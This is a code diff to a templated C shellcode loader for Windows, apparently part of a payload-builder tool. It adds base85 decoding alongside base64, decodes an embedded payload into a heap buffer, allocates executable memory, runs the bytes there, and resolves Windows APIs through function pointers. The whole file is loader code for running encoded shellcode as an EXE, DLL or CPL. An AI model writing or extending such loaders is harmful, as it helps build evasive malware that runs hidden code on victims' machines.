@@ -3,6 +3,10 @@
 #include <stdio.h>
 #include <debugapi.h>
 {% endif %}
+{% if bytecode_transformation == 'base85_encoder' %}
+#include <stdint.h>
+#include <stdbool.h>
+{% endif %}
 
 // We're using DEBUG_PRINT macro if debug mode is selected
 {% if debug_mode %}
@@ -26,7 +30,10 @@ unsigned int transformed_bytecode_len = sizeof(transformed_bytecode);
 {% include execution_partial %}
 {% if bytecode_transformation == 'base64_encoder' %}
     {% include 'partials/decode_base64.c.j2' %}
+{% elif bytecode_transformation == 'base85_encoder' %}
+    {% include 'partials/decode_base85.c.j2' %}
 {% endif %}
+
 
 // --- Function Forward Declarations ---
 void* AllocateExecutableMemory(SIZE_T size);
@@ -35,34 +42,36 @@ void ResolveAPIs();
 
 // --- Main Logic ---
 void Run() {
-    unsigned char* raw_bytecode = NULL;
-    size_t raw_bytecode_len = 0;
-    void* memory_block;
-    
+    unsigned char* decoded_bytecode = NULL;
+    size_t decoded_bytecode_len = 0;
+    void* exec_memory_block = NULL; 
     ResolveAPIs();
 
     {% if bytecode_transformation == 'base64_encoder' %}
-        DEBUG_PRINT("Run: Decoding Base64 data...");
-        raw_bytecode = Base64Decode(transformed_bytecode, transformed_bytecode_len, &raw_bytecode_len);
-        if (raw_bytecode == NULL) {
-            DEBUG_PRINT("Run: Base64 decoding failed!");
-            return;
-        }
-        DEBUG_PRINT("Run: Successfully decoded %zu bytes.", raw_bytecode_len);
+        decoded_bytecode_len = (transformed_bytecode_len / 4) * 3 + 4;
+        decoded_bytecode = (unsigned char*)pfnHeapAlloc(pfnGetProcessHeap(), 0, decoded_bytecode_len);
+        Base64Decode(transformed_bytecode, transformed_bytecode_len, decoded_bytecode, &decoded_bytecode_len);
+        DEBUG_PRINT("Run: Payload base64 decoded!");
+    {% elif bytecode_transformation == 'base85_encoder' %}
+        decoded_bytecode_len = (transformed_bytecode_len / 5) * 4 + 4;
+        decoded_bytecode = (unsigned char*)pfnHeapAlloc(pfnGetProcessHeap(), 0, decoded_bytecode_len);
+        Base85Decode(transformed_bytecode, transformed_bytecode_len, decoded_bytecode, &decoded_bytecode_len);
+        DEBUG_PRINT("Run: Payload base85 decoded");
     {% else %}
-        raw_bytecode = transformed_bytecode;
-        raw_bytecode_len = transformed_bytecode_len;
+        decoded_bytecode = transformed_bytecode;
+        decoded_bytecode_len = transformed_bytecode_len;
     {% endif %}
 
-    memory_block = AllocateExecutableMemory(raw_bytecode_len);
-    ExecutePayload(memory_block, raw_bytecode, raw_bytecode_len);
+    exec_memory_block = AllocateExecutableMemory(decoded_bytecode_len);
+    ExecutePayload(exec_memory_block, decoded_bytecode, decoded_bytecode_len);
 
-    {% if bytecode_transformation == 'base64' %}
-        if (raw_bytecode != NULL) {
-            free(raw_bytecode);
-            DEBUG_PRINT("Run: Freed memory from Base64 decoding.");
+    {% if bytecode_transformation in ['base64_encoder', 'base85_encoder'] %}
+        if (decoded_bytecode != NULL) {
+            pfnHeapFree(pfnGetProcessHeap(), 0, decoded_bytecode);
+            DEBUG_PRINT("Run: Freed memory from decoding buffer.");
         }
     {% endif %}
+
 }
 
 // --- Entry Point (EXE, DLL or CPL) ---
